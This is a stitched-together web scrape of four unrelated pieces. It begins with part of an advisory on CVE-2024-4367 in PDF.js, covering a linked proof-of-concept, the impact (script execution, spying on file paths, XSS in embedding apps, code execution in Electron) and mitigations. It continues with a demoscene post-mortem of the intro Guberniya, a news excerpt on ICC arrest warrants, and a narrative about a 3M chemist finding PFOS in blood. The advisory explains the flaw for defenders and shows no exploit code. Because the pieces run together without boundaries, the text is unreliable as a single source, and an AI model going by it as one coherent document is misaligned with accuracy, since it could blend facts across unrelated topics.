<p>You can find a proof-of-concept PDF file <a href="https://codeanlabs.com/wp-content/uploads/2024/05/CVE-2024-4367.pdf" target="_blank" rel="noopener">here</a>. It is made to be easy to adapt using a regular text editor. To demonstrate the context in which the JavaScript is running, the alert will show you the value of <code>window.origin</code>. Interestingly enough, this is not the <code>file://</code> path you see in the URL bar (if you’ve downloaded the file). Instead, PDF.js runs under the origin <code>resource://pdf.js</code>. This prevents access to local files, but it is slightly more privileged in other aspects. For example, it is possible to invoke a file download (through a dialog), even to “download” arbitrary <code>file://</code> URLs. Additionally, the real path of the opened PDF file is stored in <code>window.PDFViewerApplication.url</code>, allowing an attacker to spy on people opening a PDF file, learning not just when they open the file and what they’re doing with it, but also where the file is located on their machine.</p>
<p>In applications that embed PDF.js, the impact is potentially even worse. If no mitigations are in place (see below), this essentially gives an attacker an <a href="https://owasp.org/www-community/attacks/xss/">XSS</a> primitive on the domain which includes the PDF viewer. Depending on the application this can lead to data leaks, malicious actions being performed in the name of a victim, or even a full account take-over. On Electron apps that do not properly sandbox JavaScript code, this vulnerability even leads to native code execution (!). <strong>We found this to be the case for at least one popular Electron app</strong>.</p>
</div>

    <h2>
        Mitigation    </h2>
<div>
    <p>At Codean Labs we realize it is difficult to keep track of dependencies like this and their associated risks. It is our pleasure to take this burden from you. We perform application security assessments in an efficient, thorough and human manner, allowing you to focus on development. <a href="https://codeanlabs.com/pentest/" target="_blank" rel="noopener">Click here</a> to learn more.</p>
<p>The best mitigation against this vulnerability is to update PDF.js to version 4.2.67 or higher. Most wrapper libraries like <code>react-pdf</code> <a href="https://github.com/wojtekmaj/react-pdf/discussions/1786" target="_blank" rel="noopener">have also released</a> patched versions. Because some higher level PDF-related libraries statically embed PDF.js, we recommend recursively checking your <code>node_modules</code> folder for files called <code>pdf.js</code> to be sure. Headless use-cases of PDF.js (e.g., on the server-side to obtain statistics and data from PDFs) seem not to be affected, but we didn’t thoroughly test this. It is also advised to update.</p>
<p>Additionally, a simple workaround is to set the PDF.js setting <code>isEvalSupported</code> to <code>false</code>. This will disable the vulnerable code-path. If you have a strict <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">content-security policy</a> (disabling the use of <code>eval</code> and the <code>Function</code> constructor), the vulnerability is also not reachable.</p>

<h2 id="an-intro-to-intros">An intro to intros</h2>
<p>The demoscene is about producing cool real time works (as in “runs on your computer”) called <em>demos</em>. Some demos are really small, say 64 kilobytes or less, and these are called <em>intros</em>. The name comes from “crack intros”. So an intro is just a demo that’s small.</p>
<p>I’ve noticed many people have interest in demoscene productions but have no idea how they are actually made. This is a braindump/post-mortem of our recent 64k intro <em>Guberniya</em> and I hope that it will be interesting to newcomers and seasoned veterans alike. This article touches basically all techniques used in the demo and should give you an idea what goes into making one. I refer to people with their nick names in this article because that’s what <em>sceners</em> do.</p>

<p>Demos are usually released at a <em>demo party</em> where the audience watches demos submitted to a competition and then votes for the winner. Releasing at a party is a great way to get motivated since you have a hard deadline and an eager audience. In our case it was <a href="https://2017.revision-party.net/">Revision 2017</a>, a big traditional demo party during the Easter weekend. You can view <a href="http://tf.weimarnetz.de/revision2017/">some photos</a> to get an idea what the event is like.</p>

</div>
<p>We started working on the demo early in January and released it on the Easter weekend in April during the party. You can watch <a href="https://www.youtube.com/watch?v=1jv0woZONvc">a recording of the whole competition</a> online if you wish :)</p>
<p>We were a team of six: cce (me), <a href="https://twitter.com/martin_b_radev">varko</a>, <a href="https://twitter.com/nnnnoby">noby</a>, <a href="https://twitter.com/nicebranch">branch</a>, msqrt, and goatman.</p>
<h2 id="design-influences">Design &amp; influences</h2>
<p>The song was done pretty early on, so I tried to design things around it. It was clear we needed something big and cinematic with memorable set pieces.</p>
<p>My original visual ideas centered around wires and their usage. I really liked Viktor Antonov’s designs and my first sketches were pretty much a rip-off of Half-Life 2:</p>

<p>The similarities are quite obvious. In the landscape scenes I was also trying to capture the mood of <a href="http://anthonyscime.deviantart.com/art/Eldion-Passageway-304528786">Eldion Passageway</a> by Anthony Scimes.</p>
<p>The landscape was inspired by <a href="https://vimeo.com/189904045">this nice video of Iceland</a> and also Koyaanisqatsi, I guess. I also had big plans for the story that manifested itself as a storyboard:</p>

For example the brutalist architecture was dropped. <a href="https://www.lofibucket.com/articles/img/64k/story12.jpg">The full storyboard.</a></p>
</div>
<p>If I’d do this again I’d just settle with a timeline with a couple of photos that set the mood. It’s less work and leaves more room for imagination. But at least drawing it forced me to organize my thoughts.</p>
<h3 id="the-ship">The Ship</h3>
<p>The spaceship was designed by <a href="https://twitter.com/nnnnoby">noby</a>. It is a combination of multiple Mandelbox fractals intersected with geometric primitives. The ship’s design was left a bit incomplete, but we felt it shouldn’t be further tampered with in the final version.</p>
<div>
<p><img src="https://www.lofibucket.com/articles/img/64k/ship.jpg" alt="The spaceship is a raymarched distance field, just like everything else."></p><p>The spaceship is a raymarched distance field, just like everything else.</p>
</div>
<p>We had also another ship shader that didn’t get used. Now that I look at the design it’s also very cool and it’s a shame it didn’t find use in the intro.</p>

<h2 id="implementation">Implementation</h2>
<p>We started with a codebase built for our earlier intro <a href="http://www.pouet.net/prod.php?which=67435">Pheromone</a> (<a href="https://www.youtube.com/watch?v=BTZs8ppUtSQ">YouTube</a>). It had basic windowing and OpenGL boilerplate along with file system utility that packed files from a data directory to executable with <code>bin2h</code>.</p>
<h3 id="the-workflow">The workflow</h3>
<p>We used Visual Studio 2013 to compile the project since it wouldn’t compile on VS2015. Our standard library replacement didn’t work well with the updated compiler and produced amusing errors like this:</p>
<div>
<p><img src="https://www.lofibucket.com/articles/img/64k/linkkeri.png" alt="Visual Studio 2015 didn’t play well with our codebase."></p><p>Visual Studio 2015 didn’t play well with our codebase.</p>
</div>
<p>For some reason we stuck with VS2015 as an editor though and just compiled the project using the v120 platform toolkit.</p>
<div>
<p><img src="https://www.lofibucket.com/articles/img/64k/vs.jpg" alt="I made most of my work with the demo like this: shaders open in one window and the end result with console output in others. Full size."></p><p>I made most of my work with the demo like this: shaders open in one window and the end result with console output in others. <a href="https://www.lofibucket.com/articles/img/64k/vs.png">Full size.</a></p>
</div>
<p>We had a simple global keyboard hook that reloaded all shaders when CTRL+S key combination was detected:</p>
<div><pre><code><span>// Listen to CTRL+S.</span>
<span>if</span> (GetAsyncKeyState(VK_CONTROL) &amp;&amp; GetAsyncKeyState('S'))
{
    <span>// Wait for a while to let the file system finish the file write.</span>
    <span>if</span> (system_get_millis() - last_load &gt; <span>200</span>) {
        Sleep(<span>100</span>);
        reloadShaders();
    }
    last_load = system_get_millis();
}</code></pre></div>
<p>This worked really well and made live editing shaders much more fun. No need to have file system hooks or anything.</p>
<h3 id="gnu-rocket">GNU Rocket</h3>
<p>For animation and direction we used a <a href="https://github.com/rocket/rocket">GNU Rocket</a> fork <a href="https://github.com/edoreshef/ground-control">Ground Control</a>. Rocket is a program for editing animation curves and it connects to the demo via a TCP socket. The keyframes are sent over when requested by the demo. It’s very convenient because you can edit and recompile the demo while keeping the editor open without losing the sync position. For the final release the keyframes are exported to a binary format. It has some <a href="https://github.com/rocket/rocket/issues/63">annoying limitations</a> though.</p>
<h3 id="the-tool">The Tool</h3>
<video width="800" src="https://www.lofibucket.com/articles/img/64k/tool.mp4" controls="control">
</video>
<p><em>Moving the viewpoint with mouse and keyboard is very handy for picking camera angles. Even a simple GUI helps a lot when tweaking values.</em></p>
<p>We didn’t have a demotool <a href="http://peisik.untergrund.net/engines/">unlike some people</a> so we had to build it as we went a long. The excellent <a href="https://github.com/ocornut/imgui">dear imgui</a> library allowed us to easily add features as we needed them.</p>
<p>For example adding some sliders to control some bloom parameters is as simple as adding these lines inside the rendering loop (<em>not</em> to separate GUI code):</p>
<div><pre><code>    imgui::Begin(<span>"Postprocessing"</span>);
    imgui::SliderFloat(<span>"Bloom blur"</span>, &amp;postproc_bloom_blur_steps, <span>1</span>, <span>5</span>);
    imgui::SliderFloat(<span>"Luminance"</span>, &amp;postproc_luminance, <span>0.0</span>, <span>1.0</span>, <span>"</span><span>%.3f</span><span>"</span>, <span>1.0</span>);
    imgui::SliderFloat(<span>"Threshold"</span>, &amp;postproc_threshold, <span>0.0</span>, <span>1.0</span>, <span>"</span><span>%.3f</span><span>"</span>, <span>3.0</span>);
    imgui::End();</code></pre></div>
<p>The end result:</p>
<div>
<p><img src="https://www.lofibucket.com/articles/img/64k/imgui.png" alt="These sliders were easy to add."></p><p>These sliders were easy to add.</p>
</div>
<p>The camera position can be saved by pressing <code>F6</code> to a <code>.cpp</code> file, so the next time the code is compiled it will be included. This avoids the need for a separate data format and the related serialization code, but this solution can also get pretty messy.</p>
<h3 id="making-small-binaries">Making small binaries</h3>
<p>The key to small executables is scrapping the default standard library and compressing the compiled binary. We used Mike_V’s <a href="https://www.codeproject.com/Articles/15156/Tiny-C-Runtime-Library">Tiny C Runtime Library</a> as a base for our own library implementation.</p>
<p>The binaries are compressed with <a href="http://www.farbrausch.de/~fg/kkrunchy/">kkrunchy</a>, which is a tool made for exactly this purpose. It operates on standalone executables so you can write your demo in C++, Rust, Object Pascal or whatever. To be honest, size wasn’t really a problem for us. We didn’t store much binary data like images so we had plenty of room to play with. We didn’t even remove comments from shaders!</p>
<h3 id="floating-points">Floating points</h3>
<p>Floating point code caused some headaches by producing calls to nonexistent standard library functions. Most of these were eliminated by disabling SSE vectorization with the <code>/arch:IA32</code> compiler switch and removing calls to <code>ftol</code> with the <code>/QIfst</code> flag that generates code that doesn’t save the FPU truncation mode flags. This is not a problem because you can set the floating point truncation mode at the start of your program with this snippet courtesy of <a href="http://www.musicdsp.org/showone.php?id=246">Peter Schoffhauzer</a>:</p>
<div><pre><code><span>// set rounding mode to truncate</span>
<span>//  from http://www.musicdsp.org/showone.php?id=246</span>
<span>static</span> <span>short</span> control_word;
<span>static</span> <span>short</span> control_word2;

<span>inline</span> <span>void</span> SetFloatingPointRoundingToTruncate()
{
    __asm
    {
        fstcw   control_word                <span>// store fpu control word</span>
        mov     dx, word ptr [control_word]
        or      dx, <span>0x0C00</span>                  <span>// rounding: truncate</span>
        mov     control_word2, dx
        fldcw   control_word2               <span>// load modfied control word</span>
    }
}</code></pre></div>

<h4 id="pow">POW</h4>
<p>Calling <code>pow</code> still generated a call to <code>__CIpow</code> intrinsic function that didn’t exist. I couldn’t figure out its signature on my own but I found an implementation in <a href="https://github.com/wine-mirror/wine/blob/77887b474e60d21157cc1c59784b2b4c6c42dedf/dlls/ntdll/misc.c#L218">Wine’s <code>ntdll.dll</code></a> that revealed that it expects two double precision floats in registers. Now it was possible to make a wrapper that calls our own <code>pow</code> implementation:</p>
<div><pre><code><span>double</span> __cdecl _CIpow(<span>void</span>) {
    <span>// Load the values from registers to local variables.</span>
    <span>double</span> b, p;
    __asm {
        fstp qword ptr p
        fstp qword ptr b
    }

    <span>// Implementation: http://www.mindspring.com/~pfilandr/C/fs_math/fs_math.c</span>
    <span>return</span> fs_pow(b, p);
}</code></pre></div>
<p>If you know a nicer way to fix this, please let me know.</p>
<h3 id="winapi">WinAPI</h3>
<p>When you can’t depend on SDL or similar you need to use plain WinAPI to do the necessary plumbing to get a window on screen. If you are suffering through this, these might prove helpful:</p>
<ul>
<li><a href="https://gist.github.com/seece/1f67da14d69b9c8a75a7e6839abf8e72">WinAPI window creation example</a></li>
<li><a href="https://gist.github.com/seece/9f5f3069130c4fe642f4fd5e7375816a">OpenGL initialization example</a>, requires <a href="https://www.khronos.org/registry/OpenGL/api/GL/glext.h">glext.h</a> and <a href="https://www.khronos.org/registry/OpenGL/api/GL/wglext.h">wglext.h</a></li>
</ul>
<p>Note that we only load the function pointers for OpenGL functions that are actually used in the production in the latter example. It might be a good idea to automate this. The functions need to be queried with string identifiers that get stored in the executable, so loading as few functions as possible saves space. <a href="https://msdn.microsoft.com/en-us/library/0zza0de8.aspx">Whole Program Optimization</a> might eliminate all unreferenced string literals but we couldn’t use it because of <a href="http://stackoverflow.com/a/2945619">a problem with <code>memcpy</code></a>.</p>
<h3 id="rendering-techniques">Rendering techniques</h3>
<p>Rendering is mostly raymarching and we used the <a href="http://mercury.sexy/hg_sdf/">hg_sdf</a> library for convenience. <a href="http://iquilezles.org/www/">Íñigo Quílez</a> (from now on called just iq) has written lots about this and many of the techniques. If you’ve ever visited <a href="https://www.shadertoy.com/">ShaderToy</a> you should be familiar with this already.</p>
<p>Additionally, we had the raymarcher output a depth buffer value so we could intersect signed distance fields with rasterized geometry and also apply post-processing effects.</p>
<h3 id="shading">Shading</h3>
<p>We use standard Unreal Engine 4 shading (<a href="http://blog.selfshadow.com/publications/s2013-shading-course/karis/s2013_pbs_epic_notes_v2.pdf">here’s a big pdf that explains it</a>) with a GGX lobe. It isn’t very visible but makes a difference in highlights. Early on our plan was to have an unified lighting pipeline for both raymarched and rasterized shapes. The idea was to use deferred rendering and shadow maps, but this didn’t work at all.</p>
<div>
<p><img src="https://www.lofibucket.com/articles/img/64k/constant_shadows_thumb.jpg" alt="An early experiment with shadow mapping.

Note how both the towers and the wires cast a shadow on the raymarched terrain and also intersect correctly. <a href="https://www.lofibucket.com/articles/img/64k/constant_shadows.jpg">Full size.</a></p>
</div>
<p>Rendering huge terrains with shadow maps is super hard to get right because of the wildly varying screen-to-shadow-map-texel ratio and other accuracy problems. I wasn’t really in the mood to start experimenting with <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee416307(v=vs.85).aspx">cascaded shadow maps</a> either. Also, raymarching the same scene from multiple points of view is <em>slow</em>. So we just decided to scrap the whole unified lighting thing. This proved to be a huge pain later when were trying to match the lighting of the rasterized wires and raymarched scene geometry.</p>
<h2 id="terrain">Terrain</h2>
<p>The terrain is raymarched <a href="http://www.iquilezles.org/www/articles/morenoise/morenoise.htm">value noise</a> with analytic derivatives.<a href="#fn1" id="fnref1"><sup>1</sup></a> The generated derivates are used for shading of course, but also to control ray stepping length to accelerate ray traversal on smooth regions, just like in iq’s examples. If you want to learn more you you can read more about this technique in <a href="http://iquilezles.org/www/articles/terrainmarching/terrainmarching.htm">this old article of his</a> or play around with his <a href="https://www.shadertoy.com/view/4ttSWf">awesome rainforest scene on ShaderToy</a>. The landscape heightmap became much more realistic after msqrt implemented <a href="http://jcgt.org/published/0004/02/01/">exponentially distributed noise</a>.</p>

<p>The landscape effect is very slow because we do brute force shadows and reflections. The shadows use <a href="http://www.iquilezles.org/www/articles/rmshadows/rmshadows.htm">a soft shadow hack</a> in which the penumbra size is determined by the closest distance encountered during shadow ray traversal. They look <a href="https://www.lofibucket.com/articles/img/64k/shadow.gif">pretty nice in action</a>. We also tried using bisection tracing to speed it up but it produced too many artifacts to be useful. <a href="http://mercury.sexy/">Mercury</a>’s (another demogroup) <a href="http://erleuchtet.org/~cupe/permanent/enhanced_sphere_tracing.pdf">raymarching tricks</a> on the other hand helped us to eke out some extra quality with the same speed.</p>

<p>The sky is built using pretty much the same techniques as described by iq in <em><a href="http://www.iquilezles.org/www/material/function2009/function2009.pdf">behind elevated</a></em>, slide 43. Just some simple functions of the ray direction vector. The sun outputs pretty large values to the framebuffer (&gt;100) so it adds some natural bloom as well.</p>

<p>This is a view that was inspired by <a href="http://www.fanhophotography.com/hong-kong-yesterday.html">Fan Ho’s</a> photography. Our post-processing effects really make it come together even though the underlying geometry is pretty simple.</p>

<h2 id="modelling-with-distance-fields">Modelling with distance fields</h2>
<p>The B-52 bombers are a good example of modelling with signed distance fields. They were much simpler in the party version, but we spiced ’em up for the final. They look pretty convincing from afar:</p>

<p>However they are just a bunch of capsules. Admittedly it would’ve been easier to just to make them in some 3D package but we didn’t have any kind of mesh packing pipeline set up so this was faster. Just for reference, this is how the distance field shader looks like: <a href="https://gist.github.com/seece/dcc4e1a6a68f0a911ad05e3be755588b"><code>bomber_sdf.glsl</code></a></p>

<h2 id="post-processing">Post-processing</h2>
<p>The post-processing effects were written by varko. The pipeline is:</p>
<ol>
<li>Apply shading from G-buffer</li>
<li>Calculate depth-of-field</li>
<li>Extract bright parts for bloom</li>
<li>Perform <span><em>N</em></span> separable Gaussian blurs</li>
<li>Calculate fake lens flares &amp; wide headlight flares</li>
<li>Composite all together</li>
<li>Smooth edges with FXAA (<a href="https://github.com/dolphin-emu/dolphin/blob/master/Data/Sys/Shaders/FXAA.glsl">thanks mudlord!</a>)</li>
<li>Color correction</li>
<li>Gamma correction and subtle film grain</li>
</ol>
<p>The lens flares follow pretty much the technique <a href="http://john-chapman-graphics.blogspot.fi/2013/02/pseudo-lens-flare.html">described by John Chapman</a>. They were sometimes hard to work with but in the end still delivered.</p>
<div>
<p><img src="https://www.lofibucket.com/articles/img/64k/bigdof_thumb.jpg" alt="We tried to use the depth of field effect with good taste.

</div>
<p>The depth of field effect (based on <a href="https://www.slideshare.net/DICEStudio/five-rendering-ideas-from-battlefield-3-need-for-speed-the-run">DICE’s technique</a>) is made of three passes. The first one calculates the size of circle of confusion for each pixel and the two other passes apply two rotated box blurs each. We also do iterative refinement (i.e.&nbsp;apply multiple Gaussian blurs) when needed. This implementation worked really well for us and was fun to play with.</p>

<p><em>The depth of field effect in action. The red picture shows the calculated circle of confusion for the DOF blur.</em></p>
<h3 id="color-correction">Color correction</h3>
<p>There is an animated parameter <code>pp_index</code> in Rocket that is used to switch between color correction profiles. Each profile is just a different branch in a big switch statement in the final post-processing pass shader:</p>
<div><pre><code>vec3 cl = getFinalColor();

<span>if</span> (u_GradeId == <span>1</span>) {
    cl.gb *= UV.y * <span>0.7</span>;
    cl = pow(cl, vec3(<span>1.1</span>));
} <span>else</span> <span>if</span> (u_GradeId == <span>2</span>) {
    cl.gb *= UV.y * <span>0.6</span>;
    cl.g = <span>0.0+0.6</span>*smoothstep(-<span>0.05</span>,<span>0.9</span>,cl.g*<span>2.0</span>);
    cl = <span>0.005</span>+pow(cl, vec3(<span>1.2</span>))*<span>1.5</span>;
} <span>/* etc.. */</span></code></pre></div>
<p>It’s very simple but worked well enough.</p>
<h2 id="physics-simulation">Physics simulation</h2>
<p>There are two simulated systems in the demo: the wires and a flock. They were also written by varko.</p>
<h3 id="the-wires">The wires</h3>

<p>The wires are considered a series of springs. They are simulated on the GPU using compute shaders. We run multiple small steps of the simulation due to the instability of the Verlet integration method we use. The compute shader also outputs the wire geometry (a series of triangular prisms) to a vertex buffer. Sadly, the simulation doesn’t work on AMD cards for some reason.</p>
<h3 id="a-flock-of-birds">A flock of birds</h3>
<video width="800" src="https://www.lofibucket.com/articles/img/64k/birds.mp4" controls="control">
</video>
<p><em>The birds give a sense of scale.</em></p>
<p>The flock simulation consists of 512 birds with the first 128 considered the leaders. The leaders move in a <a href="http://prideout.net/blog/?p=63">curl noise</a> pattern and the others follow. I think in real life birds consider the movement of their closest neighbours, but this simplification looks good enough. The flock is rendered as <code>GL_POINT</code>s whose size is modulated to give appearance of flapping wings. This rendering technique was also used in Half-Life 2, I think.</p>
<h2 id="music">Music</h2>
<p>The traditional way to make music for a 64k intro is to have a <a href="https://en.wikipedia.org/wiki/Virtual_Studio_Technology">VST-instrument plugin</a> that allows a musicians to use their regular tools to compose the music. Farbrausch’s <a href="http://www.pouet.net/prod.php?which=15073">V2 synthesizer</a> is a classic example of this approach.</p>
<p>This was a problem. I didn’t want to use any ready made synthesizer but I also knew from earlier failed experiments that making my own virtual instrument would be a lot work. I remember really liking the mood of <a href="https://www.youtube.com/watch?v=Sr5Jh5hqfAA">element/gesture 61%</a>, a demo by branch with a <a href="http://hypermammut.sourceforge.net/paulstretch/">paulstretched</a> ambient song. It got me thinking about implementing it in a 4k or 64k size.</p>
<h3 id="paulstretch">Paulstretch</h3>
<p>Paulstretch is a wonderful algorithm for really crazy time stretching. If you haven’t heard about it, you should definitely listen <a href="https://www.youtube.com/watch?v=Fai5s3Zn7b4">what it can make out of Windows 98’s startup sound</a>. Its inner workings are described <a href="http://www.microscopics.co.uk/blog/2010/paulstretch-an-interview-with-paul-nasca/">in this interview with the author</a>, and it’s also open source.</p>
<div>
<p><img src="https://www.lofibucket.com/articles/img/64k/paulstretch.png" alt="Original audio (top) and stretched audio (bottom) done with Audacity’s Paulstretch effect. Note how the frequencies also get smeared across the spectrum (y-axis)."></p><p>Original audio (top) and stretched audio (bottom) done with Audacity’s Paulstretch effect. Note how the frequencies also get smeared across the spectrum (y-axis).</p>
</div>
<p>Basically, as it stretches the input it also scrambles its phases in frequency space so that instead of metallic artifacts you get ethereal echoes. This requires of course a Fourier transform and the original application uses the Kiss FFT library for this. I didn’t want to depend on an external library so in the end I implemented a naive <span>O(<em>N</em><sup>2</sup>)</span> Discrete Fourier Transform on the GPU. This took a long time to get right but in the end it was worth it. The GLSL shader implementation is very compact and runs pretty fast despite its brute-force nature.</p>
<h3 id="a-tracker-module">A tracker module</h3>
<p>Now it was possible to make swathes of ambient drone, given some reasonable input audio to stretch. So I decided to use some tried and tested technology: tracker music. It’s pretty much like MIDI<a href="#fn2" id="fnref2"><sup>2</sup></a> but with also samples packed in the file. For example elitegroup’s <a href="http://www.pouet.net/prod.php?which=374">kasparov</a> (<a href="https://www.youtube.com/watch?v=svkjjNt7J5Q">YouTube</a>) uses a module with additional reverb added. If it worked 17 years ago, why not now?</p>
<p>I used Windows’ built-in <code>gm.dls</code> MIDI soundbank file (again, a classic trick) to make a song with MilkyTracker in XM module format. This is the format that was used also for many MS-DOS demoscene productions back in the 90s.</p>
<div>
<p><img src="https://www.lofibucket.com/articles/img/64k/milky.png" alt="I used MilkyTracker to compose the original song. The instrument sample data is stripped off the final module file and replaced with offsets and lengths in gm.dls."></p><p>I used MilkyTracker to compose the original song. The instrument sample data is stripped off the final module file and replaced with offsets and lengths in <code>gm.dls</code>.</p>
</div>
<p>The catch with <code>gm.dls</code> is that the instruments, courtesy of Roland in 1996, sound very dated and cheesy. Turns out this is not a problem if you bathe them in tons of reverb! Here’s an example where a short test song is played first and a stretched version follows:</p>
<audio src="https://www.lofibucket.com/articles/img/64k/huojuu.mp3" controls="control">
</audio>
<p>Surprisingly atmospheric, right? So yeah, I made a song imitating Hollywood songwriting and it turned out great. That’s pretty much all that’s going on the music side.</p>

            The International Criminal Court is seeking arrest warrants for Hamas leader in Gaza <a href="https://cnn.com/2023/12/07/middleeast/yahya-sinwar-profile-intl/index.html">Yahya Sinwar </a>and Israeli Prime Minister Benjamin Netanyahu on charges of war crimes and crimes against humanity over the October 7 attacks on Israel and the subsequent war in Gaza, the court’s prosecutor Karim Khan told CNN’s Christiane Amanpour in an exclusive interview on Monday.

            The warrants against the Israeli politicians mark the first time the ICC has targeted the top leader of a close ally of the United States. The decision puts Netanyahu in the company of the Russian President Vladimir Putin, for whom the ICC issued an arrest warrant&nbsp;over&nbsp;Moscow’s war&nbsp;on&nbsp;Ukraine, and the Libyan strongman Moammar Gadhafi, who was facing an arrest warrant from the ICC for alleged crimes against humanity at the time of his capture and killing in October 2011.

            Monday’s announcement is not the first time that the ICC acted in relation to Israel. In March 2021, Khan’s office launched an investigation into possible crimes committed in the Palestinian territories since June 2014 in Gaza and the West Bank.

<p data-pp-blocktype="copy" data-pp-id="2.0">Kris Hansen had worked as a chemist at the 3M Corporation for about a year when her boss, an affable senior scientist named Jim Johnson, gave her a strange assignment. 3M had invented Scotch Tape and Post-­it notes; it sold everything from sandpaper to kitchen sponges. But on this day, in 1997, Johnson wanted Hansen to test human blood for chemical contamination.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="3.0">Several of 3M’s most successful products contained man-made compounds called fluorochemicals. In a spray called Scotchgard, fluorochemicals protected leather and fabric from stains. In a coating known as Scotchban, they prevented food packaging from getting soggy. In a soapy foam used by firefighters, they helped extinguish jet-fuel fires. Johnson explained to Hansen that one of the company’s fluorochemicals, PFOS — short for perfluorooctanesulfonic acid — often found its way into the bodies of 3M factory workers. Although he said that they were unharmed, he had recently hired an outside lab to measure the levels in their blood. The lab had just reported something odd, however. For the sake of comparison, it had tested blood samples from the American Red Cross, which came from the general population and should have been free of fluorochemicals. Instead, it kept finding a contaminant in the blood.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="4.0">Johnson asked Hansen to figure out whether the lab had made a mistake. Detecting trace levels of chemicals was her specialty: She had recently written a doctoral dissertation about tiny particles in the atmosphere. Hansen’s team of lab technicians and junior scientists fetched a blood sample from a lab-­supply company and prepped it for analysis. Then Hansen switched on an oven-­size box known as a mass spectrometer, which weighs molecules so that scientists can identify them.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="5.0">As the lab equipment hummed around her, Hansen loaded a sample into the machine. A graph appeared on the mass spectrometer’s display; it suggested that there was a compound in the blood that could be PFOS. That’s weird, Hansen thought. Why would a chemical produced by 3M show up in people who had never worked for the company?</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="7.0">Hansen didn’t want to share her results until she was certain that they were correct, so she and her team spent several weeks analyzing more blood, often in time-consuming overnight tests. All the samples appeared to be contaminated. When Hansen used a more precise method, liquid chromatography, the results left little doubt that the chemical in the Red Cross blood was PFOS.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="9.0">Hansen now felt obligated to update her boss. Johnson was a towering, bearded man, and she liked him: He seemed to trust her expertise, and he found something to laugh about in most conversations. But, when she shared her findings, his response was cryptic. “This changes everything,” he said. Before she could ask him what he meant, he went into his office and closed the door.</p>
        
    
                    
        
    
                    
<hr>

        
    
                    
<p data-pp-blocktype="copy" data-pp-id="12.0">This was not the first time that Hansen had found a chemical where it didn’t belong. A wiry woman who grew up skiing competitively, Hansen had always liked to spend time outdoors; for her chemistry thesis at Williams College, she had kayaked around the former site of an electric company on the Hoosic River, collecting crayfish and testing them for industrial pollutants called polychlorinated biphenyls, or PCBs. Her research, which showed that a drainage ditch at the site was leaking the chemicals, prompted a news story and contributed to a cleanup effort overseen by the Massachusetts Department of Environmental Protection. At 3M, Hansen assumed that her bosses would respond to her findings with the same kind of diligence and care.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="13.0">Hansen stayed near Johnson’s office for the rest of the day, anxiously waiting for him to react to her research. He never did. In the days that followed, Hansen sensed that Johnson had notified some of his superiors. She remembers his boss, Dale Bacon, a paunchy fellow with gray hair, stopping by her desk and suggesting that she had made a mistake. “I don’t think so,” she told him. In subsequent weeks, Hansen and her team ordered fresh blood samples from every supplier that 3M worked with. Each of the samples tested positive for PFOS.</p>

<p data-pp-blocktype="copy" data-pp-id="15.0">In the middle of this testing, Johnson suddenly announced that he would be taking early retirement. After he packed up his office and left, Hansen felt adrift. She was so new to corporate life that her office clothes — pleated pants and dress shirts — still felt like a costume. Johnson had always guided her research, and he hadn’t told Hansen what she should do next. She reminded herself of what he had said — that the chemical wasn’t harmful in factory workers. But she couldn’t be sure that it was harm<em>less</em>. She knew that PCBs, for example, were mass-produced for years before studies showed that they accumulate in the food chain and cause a range of health issues, including damage to the brain. The most reliable way to gauge the safety of chemicals is to study them over time, in animals and, if possible, in humans.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="16.0">What Hansen didn’t know was that 3M had already conducted animal studies — two decades earlier. They had shown PFOS to be toxic, yet the results remained secret, even to many at the company. In one early experiment, conducted in the late ’70s, a group of 3M scientists fed PFOS to rats on a daily basis. Starting at the second-lowest dose that the scientists tested, about 10 milligrams for every kilogram of body weight, the rats showed signs of possible harm to their livers, and half of them died. At higher doses, every rat died. Soon afterward, 3M scientists found that a relatively low daily dose, 4.5 milligrams for every kilogram of body weight, could kill a monkey within weeks. (Based on this result, the chemical would currently fall into the highest of five toxicity levels recognized by the United Nations.) This daily dose of PFOS was orders of magnitude greater than the amount that the average person would ingest, but it was still relatively low — roughly comparable to the dose of aspirin in a standard tablet.</p>
        
    
                        


   
            
            
            
            

   
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="18.0">In 1979, an internal company report deemed PFOS “certainly more toxic than anticipated” and recommended longer-term studies. That year, 3M executives flew to San Francisco to consult Harold Hodge, a respected toxicologist. They told Hodge only part of what they knew: that PFOS had sickened and even killed laboratory animals and had caused liver abnormalities in factory workers. According to a 3M document that was marked “CONFIDENTIAL,” Hodge urged the executives to study whether the company’s fluorochemicals caused reproductive issues or cancer. After reviewing more data, he told one of them to find out whether the chemicals were present “in man,” and he added, “If the levels are high and widespread and the half-life is long, we could have a serious problem.” <a href="https://grist.org/accountability/3m-pfas-drinking-water-forever-chemicals-lawsuit/">Yet Hodge’s warning was omitted from official meeting notes</a>, and the company’s fluorochemical production increased over time.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="20.0">Hansen’s bosses never told her that PFOS was toxic. In the weeks after Johnson left 3M, however, she felt that she was under a new level of scrutiny. One of her superiors suggested that her equipment might be contaminated, so she cleaned the mass spectrometer and then the entire lab. Her results didn’t change. Another encouraged her to repeatedly analyze her syringes, bags and test tubes, in case they had tainted the blood. (They had not.) Her managers were less concerned about PFOS, it seemed to Hansen, than about the chance that she was wrong.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="21.0">Sometimes Hansen doubted herself. She was 28 and had only recently earned her Ph.D. But she continued her experiments, if only to respond to the questions of her managers. 3M bought three additional mass spectrometers, which each cost more than a car, and Hansen used them to test more blood samples. In late 1997, her new boss, Bacon, even had her fly out to the company that manufactured the machines, so that she could repeat her tests there. She studied the blood of hundreds of people from more than a dozen blood banks in various states. Each sample contained PFOS. The chemical seemed to be everywhere.</p>

